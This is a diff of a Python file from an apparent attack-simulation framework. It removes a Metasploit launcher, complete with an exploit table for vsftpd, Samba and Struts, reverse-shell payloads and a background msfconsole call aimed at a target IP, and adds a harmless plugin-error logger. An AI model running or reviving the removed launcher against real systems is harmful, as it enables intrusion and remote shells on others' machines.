@@ -1,83 +1,64 @@
 import os
-import time
-import subprocess
+import json
 from pathlib import Path
+from datetime import datetime
 
-EXPLOIT_LIBRARY = {
-    "ftp_vsftpd": {
-        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
-        "payload": "cmd/unix/interact",
-        "default_port": 21
-    },
-    "samba_usermap": {
-        "module": "exploit/linux/samba/usermap_script",
-        "payload": "cmd/unix/reverse",
-        "default_port": 139
-    },
-    "apache_struts": {
-        "module": "exploit/multi/http/struts2_content_type_ognl",
-        "payload": "java/meterpreter/reverse_tcp",
-        "default_port": 8080
-    }
-}
+PLUGIN_ERROR_LOG = os.path.expanduser("~/.evilEVE/logs/plugin_errors.jsonl")
 
-def run_msf_attack(
-    target_ip, 
-    exploit_name="ftp_vsftpd",
-    lhost="10.0.0.100",
-    lport="4444",
-    log_dir="logs/metasploit"
-):
-    Path(log_dir).mkdir(parents=True, exist_ok=True)
-    timestamp = int(time.time())
-    script_path = os.path.join(log_dir, f"attack_{timestamp}.rc")
-    log_path = os.path.join(log_dir, f"msf_{timestamp}.log")
 
-    if exploit_name not in EXPLOIT_LIBRARY:
-        raise ValueError(f"[metasploit_plugin] Unknown exploit: {exploit_name}")
+def log_plugin_error(attacker: str, phase: str, tool: str, error_msg: str, context: dict = None):
+    """
+    Appends a plugin error entry to the plugin error log.
 
-    module = EXPLOIT_LIBRARY[exploit_name]
+    Args:
+        attacker (str): Attacker name or profile.
+        phase (str): MITRE phase where the error occurred.
+        tool (str): The plugin/tool involved (e.g., metasploit, ghidra).
+        error_msg (str): Description of the error or exception.
+        context (dict): Optional additional details (e.g., input params).
+    """
+    Path(os.path.dirname(PLUGIN_ERROR_LOG)).mkdir(parents=True, exist_ok=True)
 
-    with open(script_path, "w") as f:
-        f.write(f"use {module['module']}\n")
-        f.write(f"set RHOST {target_ip}\n")
-        f.write(f"set LHOST {lhost}\n")
-        f.write(f"set LPORT {lport}\n")
-        f.write(f"set PAYLOAD {module['payload']}\n")
-        f.write("exploit -j\n")
-
-    subprocess.Popen(
-        ["nohup", "msfconsole", "-r", script_path],
-        stdout=open(log_path, "w"),
-        stderr=subprocess.STDOUT,
-        preexec_fn=os.setpgrp
-    )
-
-    print(f"[metasploit_plugin] Launched '{exploit_name}' against {target_ip} → {log_path}")
-    return {
-        "script": script_path,
-        "log": log_path,
-        "exploit": exploit_name,
-        "timestamp": timestamp
+    entry = {
+        "timestamp": datetime.now().isoformat(),
+        "attacker": attacker,
+        "phase": phase,
+        "tool": tool,
+        "error": error_msg,
+        "context": context or {}
     }
 
-def parse_msf_log(log_path):
+    try:
+        with open(PLUGIN_ERROR_LOG, "a") as f:
+            f.write(json.dumps(entry) + "\n")
+    except Exception as e:
+        print(f"[plugin_errors] Failed to write plugin error: {e}")
+
+
+def summarize_plugin_errors(log_path=PLUGIN_ERROR_LOG):
     """
-    Returns a structured summary: session opened, failure, crash, etc.
+    Prints a summary of plugin errors from the log.
+
+    Args:
+        log_path (str): Path to the plugin error log file.
     """
-    outcome = {"session_opened": False, "errors": [], "log_path": log_path}
+    if not os.path.exists(log_path):
+        print("[plugin_errors] No plugin errors were logged.")
+        return
+
     try:
         with open(log_path) as f:
-            lines = f.readlines()
-
-        for line in lines:
-            if "Meterpreter session" in line or "Command shell session" in line:
-                outcome["session_opened"] = True
-            if "[error]" in line.lower() or "failed" in line.lower():
-                outcome["errors"].append(line.strip())
-
+            entries = [json.loads(line) for line in f if line.strip()]
     except Exception as e:
-        outcome["errors"].append(f"Log parsing failed: {e}")
+        print(f"[plugin_errors] Could not parse plugin error log: {e}")
+        return
 
-    return outcome
+    if not entries:
+        print("[plugin_errors] No plugin errors found.")
+        return
+
+    print("\n=== Plugin Error Summary ===")
+    for entry in entries:
+        print(f"[{entry['timestamp']}] Phase: {entry['phase']} | Tool: {entry['tool']} | Error: {entry['error']}")
+
 
